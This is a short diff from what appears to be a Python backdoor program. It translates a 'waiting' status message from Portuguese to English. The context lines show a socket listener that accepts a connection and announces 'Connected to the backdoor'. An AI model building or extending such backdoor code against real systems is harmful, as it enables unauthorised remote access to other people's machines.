@@ -10,7 +10,7 @@ server.listen(1)
 
 # Input processing loop
 while True:
-    print('Aguardando')
+    print('Waiting...')
     connection, client = server.accept()
     connection.send('\033[1;34m[+] \033[mConnected to the backdoor\n'.encode(encoding='UTF-8'))
     print(f'Conectado a {client}')
